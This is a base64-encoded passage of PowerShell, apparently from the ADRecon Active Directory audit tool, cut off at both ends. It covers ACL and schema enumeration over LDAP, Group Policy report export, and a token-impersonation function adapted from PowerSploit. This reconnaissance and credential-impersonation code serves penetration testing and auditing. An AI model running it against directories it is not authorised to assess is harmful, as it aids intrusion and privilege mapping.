KSkKICAgICAgICAgICAgICAgICRBREZvcmVzdCA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkZvcmVzdF06OkdldEZvcmVzdCgkRm9yZXN0Q29udGV4dCkKICAgICAgICAgICAgICAgICRTY2hlbWFQYXRoID0gJEFERm9yZXN0LlNjaGVtYS5OYW1lCiAgICAgICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURGb3Jlc3QKICAgICAgICAgICAgfQogICAgICAgICAgICBDYXRjaAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUkFDTF0gRXJyb3IgZW51bWVyYXRpbmcgU2NoZW1hUGF0aCIKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIEVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRBRERvbWFpbiA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRvbWFpbl06OkdldEN1cnJlbnREb21haW4oKQogICAgICAgICAgICAkQURGb3Jlc3QgPSBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5Gb3Jlc3RdOjpHZXRDdXJyZW50Rm9yZXN0KCkKICAgICAgICAgICAgJFNjaGVtYVBhdGggPSAkQURGb3Jlc3QuU2NoZW1hLk5hbWUKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFERm9yZXN0CiAgICAgICAgfQoKICAgICAgICBJZiAoJFNjaGVtYVBhdGgpCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbKl0gRW51bWVyYXRpbmcgc2NoZW1hSURzIgogICAgICAgICAgICBJZiAoJENyZWRlbnRpYWwgLW5lIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRvYmpTZWFyY2hQYXRoID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnkgIkxEQVA6Ly8kKCREb21haW5Db250cm9sbGVyKS8kKCRTY2hlbWFQYXRoKSIsICRDcmVkZW50aWFsLlVzZXJOYW1lLCRDcmVkZW50aWFsLkdldE5ldHdvcmtDcmVkZW50aWFsKCkuUGFzc3dvcmQKICAgICAgICAgICAgICAgICRvYmpTZWFyY2hlclBhdGggPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlTZWFyY2hlciAkb2JqU2VhcmNoUGF0aAogICAgICAgICAgICB9CiAgICAgICAgICAgIEVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJG9ialNlYXJjaGVyUGF0aCA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeVNlYXJjaGVyIChbQURTSV0gIkxEQVA6Ly8kKCRTY2hlbWFQYXRoKSIpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJG9ialNlYXJjaGVyUGF0aC5QYWdlU2l6ZSA9ICRQYWdlU2l6ZQogICAgICAgICAgICAkb2JqU2VhcmNoZXJQYXRoLmZpbHRlciA9ICIoc2NoZW1hSURHVUlEPSopIgoKICAgICAgICAgICAgVHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRTY2hlbWFTZWFyY2hlciA9ICRvYmpTZWFyY2hlclBhdGguRmluZEFsbCgpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgQ2F0Y2gKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJBQ0xdIEVycm9yIGVudW1lcmF0aW5nIFNjaGVtYUlEcyIKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICB9CgogICAgICAgICAgICBJZiAoJFNjaGVtYVNlYXJjaGVyKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkU2NoZW1hU2VhcmNoZXIgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAjIGNvbnZlcnQgdGhlIEdVSUQKICAgICAgICAgICAgICAgICAgICAkR1VJRHNbKE5ldy1PYmplY3QgR3VpZCAoLCRfLnByb3BlcnRpZXMuc2NoZW1haWRndWlkWzBdKSkuR3VpZF0gPSAkXy5wcm9wZXJ0aWVzLm5hbWVbMF0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRTY2hlbWFTZWFyY2hlci5kaXNwb3NlKCkKICAgICAgICAgICAgfQogICAgICAgICAgICAkb2JqU2VhcmNoZXJQYXRoLmRpc3Bvc2UoKQoKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIEVudW1lcmF0aW5nIEFjdGl2ZSBEaXJlY3RvcnkgUmlnaHRzIgogICAgICAgICAgICBJZiAoJENyZWRlbnRpYWwgLW5lIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRvYmpTZWFyY2hQYXRoID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnkgIkxEQVA6Ly8kKCREb21haW5Db250cm9sbGVyKS8kKCRTY2hlbWFQYXRoLnJlcGxhY2UoIlNjaGVtYSIsIkV4dGVuZGVkLVJpZ2h0cyIpKSIsICRDcmVkZW50aWFsLlVzZXJOYW1lLCRDcmVkZW50aWFsLkdldE5ldHdvcmtDcmVkZW50aWFsKCkuUGFzc3dvcmQKICAgICAgICAgICAgICAgICRvYmpTZWFyY2hlclBhdGggPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlTZWFyY2hlciAkb2JqU2VhcmNoUGF0aAogICAgICAgICAgICB9CiAgICAgICAgICAgIEVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJG9ialNlYXJjaGVyUGF0aCA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeVNlYXJjaGVyIChbQURTSV0gIkxEQVA6Ly8kKCRTY2hlbWFQYXRoLnJlcGxhY2UoIlNjaGVtYSIsIkV4dGVuZGVkLVJpZ2h0cyIpKSIpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJG9ialNlYXJjaGVyUGF0aC5QYWdlU2l6ZSA9ICRQYWdlU2l6ZQogICAgICAgICAgICAkb2JqU2VhcmNoZXJQYXRoLmZpbHRlciA9ICIob2JqZWN0Q2xhc3M9Y29udHJvbEFjY2Vzc1JpZ2h0KSIKCiAgICAgICAgICAgIFRyeQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkUmlnaHRzU2VhcmNoZXIgPSAkb2JqU2VhcmNoZXJQYXRoLkZpbmRBbGwoKQogICAgICAgICAgICB9CiAgICAgICAgICAgIENhdGNoCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSQUNMXSBFcnJvciBlbnVtZXJhdGluZyBBY3RpdmUgRGlyZWN0b3J5IFJpZ2h0cyIKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICB9CgogICAgICAgICAgICBJZiAoJFJpZ2h0c1NlYXJjaGVyKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkUmlnaHRzU2VhcmNoZXIgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAjIGNvbnZlcnQgdGhlIEdVSUQKICAgICAgICAgICAgICAgICAgICAkR1VJRHNbJF8ucHJvcGVydGllcy5yaWdodHNndWlkWzBdLnRvU3RyaW5nKCldID0gJF8ucHJvcGVydGllcy5uYW1lWzBdCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkUmlnaHRzU2VhcmNoZXIuZGlzcG9zZSgpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJG9ialNlYXJjaGVyUGF0aC5kaXNwb3NlKCkKICAgICAgICB9CgogICAgICAgICMgR2V0IHRoZSBEb21haW4sIE9VcywgUm9vdCBDb250YWluZXJzLCBHUE8sIFVzZXIsIENvbXB1dGVyIGFuZCBHcm91cCBvYmplY3RzLgogICAgICAgICRPYmpzID0gQCgpCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIEVudW1lcmF0aW5nIERvbWFpbiwgT1UsIEdQTywgVXNlciwgQ29tcHV0ZXIgYW5kIEdyb3VwIE9iamVjdHMiCiAgICAgICAgJG9ialNlYXJjaGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXIgJG9iakRvbWFpbgogICAgICAgICRPYmpTZWFyY2hlci5QYWdlU2l6ZSA9ICRQYWdlU2l6ZQogICAgICAgICRPYmpTZWFyY2hlci5GaWx0ZXIgPSAiKHwob2JqZWN0Q2xhc3M9ZG9tYWluKShvYmplY3RDYXRlZ29yeT1vcmdhbml6YXRpb25hbHVuaXQpKG9iamVjdENhdGVnb3J5PWdyb3VwUG9saWN5Q29udGFpbmVyKShzYW1BY2NvdW50VHlwZT04MDUzMDYzNjgpKHNhbUFjY291bnRUeXBlPTgwNTMwNjM2OSkoc2FtYWNjb3VudHR5cGU9MjY4NDM1NDU2KShzYW1hY2NvdW50dHlwZT0yNjg0MzU0NTcpKHNhbWFjY291bnR0eXBlPTUzNjg3MDkxMikoc2FtYWNjb3VudHR5cGU9NTM2ODcwOTEzKSkiCiAgICAgICAgIyBodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L3N5c3RlbS5kaXJlY3RvcnlzZXJ2aWNlcy5zZWN1cml0eW1hc2tzKHY9dnMuMTEwKS5hc3B4CiAgICAgICAgJE9ialNlYXJjaGVyLlNlY3VyaXR5TWFza3MgPSBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLlNlY3VyaXR5TWFza3NdOjpEYWNsIC1ib3IgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5TZWN1cml0eU1hc2tzXTo6R3JvdXAgLWJvciBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLlNlY3VyaXR5TWFza3NdOjpPd25lciAtYm9yIFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuU2VjdXJpdHlNYXNrc106OlNhY2wKICAgICAgICAkT2JqU2VhcmNoZXIuUHJvcGVydGllc1RvTG9hZC5BZGRSYW5nZSgoImRpc3BsYXluYW1lIiwiZGlzdGluZ3Vpc2hlZG5hbWUiLCJuYW1lIiwibnRzZWN1cml0eWRlc2NyaXB0b3IiLCJvYmplY3RjbGFzcyIsIm9iamVjdHNpZCIpKQogICAgICAgICRPYmpTZWFyY2hlci5TZWFyY2hTY29wZSA9ICJTdWJ0cmVlIgoKICAgICAgICBUcnkKICAgICAgICB7CiAgICAgICAgICAgICRPYmpzICs9ICRPYmpTZWFyY2hlci5GaW5kQWxsKCkKICAgICAgICB9CiAgICAgICAgQ2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSQUNMXSBFcnJvciB3aGlsZSBlbnVtZXJhdGluZyBEb21haW4sIE9VLCBHUE8sIFVzZXIsIENvbXB1dGVyIGFuZCBHcm91cCBPYmplY3RzIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICB9CiAgICAgICAgJE9ialNlYXJjaGVyLmRpc3Bvc2UoKQoKICAgICAgICBXcml0ZS1WZXJib3NlICJbKl0gRW51bWVyYXRpbmcgUm9vdCBDb250YWluZXIgT2JqZWN0cyIKICAgICAgICAkb2JqU2VhcmNoZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlTZWFyY2hlciAkb2JqRG9tYWluCiAgICAgICAgJE9ialNlYXJjaGVyLlBhZ2VTaXplID0gJFBhZ2VTaXplCiAgICAgICAgJE9ialNlYXJjaGVyLkZpbHRlciA9ICIob2JqZWN0Q2xhc3M9Y29udGFpbmVyKSIKICAgICAgICAjIGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvc3lzdGVtLmRpcmVjdG9yeXNlcnZpY2VzLnNlY3VyaXR5bWFza3Modj12cy4xMTApLmFzcHgKICAgICAgICAkT2JqU2VhcmNoZXIuU2VjdXJpdHlNYXNrcyA9ICRPYmpTZWFyY2hlci5TZWN1cml0eU1hc2tzID0gW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5TZWN1cml0eU1hc2tzXTo6RGFjbCAtYm9yIFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuU2VjdXJpdHlNYXNrc106Okdyb3VwIC1ib3IgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5TZWN1cml0eU1hc2tzXTo6T3duZXIgLWJvciBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLlNlY3VyaXR5TWFza3NdOjpTYWNsCiAgICAgICAgJE9ialNlYXJjaGVyLlByb3BlcnRpZXNUb0xvYWQuQWRkUmFuZ2UoKCJkaXN0aW5ndWlzaGVkbmFtZSIsIm5hbWUiLCJudHNlY3VyaXR5ZGVzY3JpcHRvciIsIm9iamVjdGNsYXNzIikpCiAgICAgICAgJE9ialNlYXJjaGVyLlNlYXJjaFNjb3BlID0gIk9uZUxldmVsIgoKICAgICAgICBUcnkKICAgICAgICB7CiAgICAgICAgICAgICRPYmpzICs9ICRPYmpTZWFyY2hlci5GaW5kQWxsKCkKICAgICAgICB9CiAgICAgICAgQ2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSQUNMXSBFcnJvciB3aGlsZSBlbnVtZXJhdGluZyBSb290IENvbnRhaW5lciBPYmplY3RzIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICB9CiAgICAgICAgJE9ialNlYXJjaGVyLmRpc3Bvc2UoKQoKICAgICAgICBJZiAoJE9ianMpCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbKl0gVG90YWwgT2JqZWN0czogJChbQURSZWNvbi5MREFQQ2xhc3NdOjpPYmplY3RDb3VudCgkT2JqcykpIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbLV0gREFDTHMiCiAgICAgICAgICAgICREQUNMT2JqID0gW0FEUmVjb24uTERBUENsYXNzXTo6REFDTFBhcnNlcigkT2JqcywgJEdVSURzLCAkVGhyZWFkcykKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWy1dIFNBQ0xzIC0gTWF5IG5lZWQgYSBQcml2aWxlZ2VkIEFjY291bnQiCiAgICAgICAgICAgICRTQUNMT2JqID0gW0FEUmVjb24uTERBUENsYXNzXTo6U0FDTFBhcnNlcigkT2JqcywgJEdVSURzLCAkVGhyZWFkcykKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIE9ianMKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEdVSURzCiAgICAgICAgfQogICAgfQoKICAgIElmICgkREFDTE9iaikKICAgIHsKICAgICAgICBFeHBvcnQtQURSICREQUNMT2JqICRBRFJPdXRwdXREaXIgJE91dHB1dFR5cGUgIkRBQ0xzIgogICAgICAgIFJlbW92ZS1WYXJpYWJsZSBEQUNMT2JqCiAgICB9CgogICAgSWYgKCRTQUNMT2JqKQogICAgewogICAgICAgIEV4cG9ydC1BRFIgJFNBQ0xPYmogJEFEUk91dHB1dERpciAkT3V0cHV0VHlwZSAiU0FDTHMiCiAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIFNBQ0xPYmoKICAgIH0KfQoKRnVuY3Rpb24gR2V0LUFEUkdQT1JlcG9ydAp7CjwjCi5TWU5PUFNJUwogICAgUnVucyB0aGUgR2V0LUdQT1JlcG9ydCBjbWRsZXQgaWYgYXZhaWxhYmxlLgoKLkRFU0NSSVBUSU9OCiAgICBSdW5zIHRoZSBHZXQtR1BPUmVwb3J0IGNtZGxldCBpZiBhdmFpbGFibGUgYW5kIHNhdmVzIGluIEhUTUwgYW5kIFhNTCBmb3JtYXRzLgoKLlBBUkFNRVRFUiBQcm90b2NvbAogICAgW3N0cmluZ10KICAgIFdoaWNoIHByb3RvY29sIHRvIHVzZTsgQURXUyAoZGVmYXVsdCkgb3IgTERBUC4KCi5QQVJBTUVURVIgVXNlQWx0Q3JlZHMKICAgIFtib29sXQogICAgV2hldGhlciB0byB1c2UgcHJvdmlkZWQgY3JlZGVudGlhbHMgb3Igbm90LgoKLlBBUkFNRVRFUiBBRFJPdXRwdXREaXIKICAgIFtzdHJpbmddCiAgICBQYXRoIGZvciBBRFJlY29uIG91dHB1dCBmb2xkZXIuCgouT1VUUFVUUwogICAgSFRNTCBhbmQgWE1MIEdQT1JlcG9ydHMgYXJlIGNyZWF0ZWQgaW4gdGhlIGZvbGRlciBzcGVjaWZpZWQuCiM+CiAgICBwYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbc3RyaW5nXSAkUHJvdG9jb2wsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtib29sXSAkVXNlQWx0Q3JlZHMsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtzdHJpbmddICRBRFJPdXRwdXREaXIKICAgICkKCiAgICBJZiAoJFByb3RvY29sIC1lcSAnQURXUycpCiAgICB7CiAgICAgICAgVHJ5CiAgICAgICAgewogICAgICAgICAgICAjIFN1cHByZXNzIHZlcmJvc2Ugb3V0cHV0IG9uIG1vZHVsZSBpbXBvcnQKICAgICAgICAgICAgJFNhdmVWZXJib3NlUHJlZmVyZW5jZSA9ICRzY3JpcHQ6VmVyYm9zZVByZWZlcmVuY2UKICAgICAgICAgICAgJHNjcmlwdDpWZXJib3NlUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJwogICAgICAgICAgICBJbXBvcnQtTW9kdWxlIEdyb3VwUG9saWN5IC1XYXJuaW5nQWN0aW9uIFN0b3AgLUVycm9yQWN0aW9uIFN0b3AgfCBPdXQtTnVsbAogICAgICAgICAgICBJZiAoJFNhdmVWZXJib3NlUHJlZmVyZW5jZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJHNjcmlwdDpWZXJib3NlUHJlZmVyZW5jZSA9ICRTYXZlVmVyYm9zZVByZWZlcmVuY2UKICAgICAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBTYXZlVmVyYm9zZVByZWZlcmVuY2UKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBDYXRjaAogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJHUE9SZXBvcnRdIEVycm9yIGltcG9ydGluZyB0aGUgR3JvdXBQb2xpY3kgTW9kdWxlLiBTa2lwcGluZyBHUE9SZXBvcnQiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICBJZiAoJFNhdmVWZXJib3NlUHJlZmVyZW5jZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJHNjcmlwdDpWZXJib3NlUHJlZmVyZW5jZSA9ICRTYXZlVmVyYm9zZVByZWZlcmVuY2UKICAgICAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBTYXZlVmVyYm9zZVByZWZlcmVuY2UKICAgICAgICAgICAgfQogICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICB9CiAgICAgICAgVHJ5CiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbKl0gR1BPUmVwb3J0IFhNTCIKICAgICAgICAgICAgJEFERmlsZU5hbWUgPSAtam9pbigkQURST3V0cHV0RGlyLCdcJywnR1BPLVJlcG9ydCcsJy54bWwnKQogICAgICAgICAgICBHZXQtR1BPUmVwb3J0IC1BbGwgLVJlcG9ydFR5cGUgWE1MIC1QYXRoICRBREZpbGVOYW1lCiAgICAgICAgfQogICAgICAgIENhdGNoCiAgICAgICAgewogICAgICAgICAgICBJZiAoJFVzZUFsdENyZWRzKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbKl0gUnVuIHRoZSB0b29sIHVzaW5nIFJVTkFTLiIKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIlsqXSBydW5hcyAvdXNlcjo8RG9tYWluIEZRRE4+XDxVc2VybmFtZT4gL25ldG9ubHkgcG93ZXJzaGVsbC5leGUiCiAgICAgICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICAgICAgfQogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUkdQT1JlcG9ydF0gRXJyb3IgZ2V0dGluZyB0aGUgR1BPUmVwb3J0IGluIFhNTCIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgfQogICAgICAgIFRyeQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIEdQT1JlcG9ydCBIVE1MIgogICAgICAgICAgICAkQURGaWxlTmFtZSA9IC1qb2luKCRBRFJPdXRwdXREaXIsJ1wnLCdHUE8tUmVwb3J0JywnLmh0bWwnKQogICAgICAgICAgICBHZXQtR1BPUmVwb3J0IC1BbGwgLVJlcG9ydFR5cGUgSFRNTCAtUGF0aCAkQURGaWxlTmFtZQogICAgICAgIH0KICAgICAgICBDYXRjaAogICAgICAgIHsKICAgICAgICAgICAgSWYgKCRVc2VBbHRDcmVkcykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiWypdIFJ1biB0aGUgdG9vbCB1c2luZyBSVU5BUy4iCiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbKl0gcnVuYXMgL3VzZXI6PERvbWFpbiBGUUROPlw8VXNlcm5hbWU+IC9uZXRvbmx5IHBvd2Vyc2hlbGwuZXhlIgogICAgICAgICAgICAgICAgUmV0dXJuICRudWxsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJHUE9SZXBvcnRdIEVycm9yIGdldHRpbmcgdGhlIEdQT1JlcG9ydCBpbiBYTUwiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgIH0KICAgIH0KICAgIElmICgkUHJvdG9jb2wgLWVxICdMREFQJykKICAgIHsKICAgICAgICBXcml0ZS1XYXJuaW5nICJbKl0gQ3VycmVudGx5LCB0aGUgbW9kdWxlIGlzIG9ubHkgc3VwcG9ydGVkIHdpdGggQURXUy4iCiAgICB9Cn0KCiMgTW9kaWZpZWQgSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIGZ1bmN0aW9uIGZyb20gaHR0cHM6Ly9naXRodWIuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdC9ibG9iL2Rldi9SZWNvbi9Qb3dlclZpZXcucHMxCkZ1bmN0aW9uIEdldC1BRFJVc2VySW1wZXJzb25hdGlvbgp7CjwjCi5TWU5PUFNJUwoKQ3JlYXRlcyBhIG5ldyAicnVuYXMgL25ldG9ubHkiIHR5cGUgbG9nb24gYW5kIGltcGVyc29uYXRlcyB0aGUgdG9rZW4uCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkKTGljZW5zZTogQlNEIDMtQ2xhdXNlClJlcXVpcmVkIERlcGVuZGVuY2llczogUFNSZWZsZWN0CgouREVTQ1JJUFRJT04KClRoaXMgZnVuY3Rpb24gdXNlcyBMb2dvblVzZXIoKSB3aXRoIHRoZSBMT0dPTjMyX0xPR09OX05FV19DUkVERU5USUFMUyBMb2dvblR5cGUKdG8gc2ltdWxhdGUgInJ1bmFzIC9uZXRvbmx5Ii4gVGhlIHJlc3VsdGluZyB0b2tlbiBpcyB0aGVuIGltcGVyc29uYXRlZCB3aXRoCkltcGVyc29uYXRlTG9nZ2VkT25Vc2VyKCkgYW5kIHRoZSB0b2tlbiBoYW5kbGUgaXMgcmV0dXJuZWQgZm9yIGxhdGVyIHVzYWdlCndpdGggSW52b2tlLVJldmVydFRvU2VsZi4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IHdpdGggYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCnRvIGltcGVyc29uYXRlIGluIHRoZSBjdXJyZW50IHRocmVhZCBzcGFjZS4KCi5QQVJBTUVURVIgVG9rZW5IYW5kbGUKCkFuIEludFB0ciBUb2tlbkhhbmRsZSByZXR1cm5lZCBieSBhIHByZXZpb3VzIEludm9rZS1Vc2VySW1wZXJzb25hdGlvbi4KSWYgdGhpcyBpcyBzdXBwbGllZCwgTG9nb25Vc2VyKCkgaXMgc2tpcHBlZCBhbmQgb25seSBJbXBlcnNvbmF0ZUxvZ2dlZE9uVXNlcigpCmlzIGV4ZWN1dGVkLgoKLlBBUkFNRVRFUiBRdWlldAoKU3VwcHJlc3MgYW55IHdhcm5pbmdzIGFib3V0IFNUQSB2cyBNVEEuCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1DcmVkZW50aWFsICRDcmVkCgouT1VUUFVUUwoKSW50UHRyCgpUaGUgVG9rZW5IYW5kbGUgcmVzdWx0IGZyb20gTG9nb25Vc2VyLgojPgoKICAgIFtPdXRwdXRUeXBlKFtJbnRQdHJdKV0KICAgIFtDbWRsZXRCaW5kaW5nKERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lID0gJ0NyZWRlbnRpYWwnKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUsIFBhcmFtZXRlclNldE5hbWUgPSAnQ3JlZGVudGlhbCcpXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRUcnVlLCBQYXJhbWV0ZXJTZXROYW1lID0gJ1Rva2VuSGFuZGxlJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbCgpXQogICAgICAgIFtJbnRQdHJdCiAgICAgICAgJFRva2VuSGFuZGxlLAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRRdWlldAogICAgKQoKICAgIElmICgoW1N5c3RlbS5UaHJlYWRpbmcuVGhyZWFkXTo6Q3VycmVudFRocmVhZC5HZXRBcGFydG1lbnRTdGF0ZSgpIC1uZSAnU1RBJykgLWFuZCAoLW5vdCAkUFNCb3VuZFBhcmFtZXRlcnNbJ1F1aWV0J10pKQogICAgewogICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSVXNlckltcGVyc29uYXRpb25dIHBvd2Vyc2hlbGwuZXhlIGlzIG5vdCBjdXJyZW50bHkgaW4gYSBzaW5nbGUtdGhyZWFkZWQgYXBhcnRtZW50IHN0YXRlLCB0b2tlbiBpbXBlcnNvbmF0aW9uIG1heSBub3Qgd29yay4iCiAgICB9CgogICAgSWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9rZW5IYW5kbGUnXSkKICAgIHsKICAgICAgICAkTG9nb25Ub2tlbkhhbmRsZSA9ICRUb2tlbkhhbmRsZQogICAgfQogICAgRWxzZQogICAgewogICAgICAgICRMb2dvblRva2VuSGFuZGxlID0gW0ludFB0cl06Olplcm8KICAgICAgICAkTmV0d29ya0NyZWRlbnRpYWwgPSAkQ3JlZGVudGlhbC5HZXROZXR3b3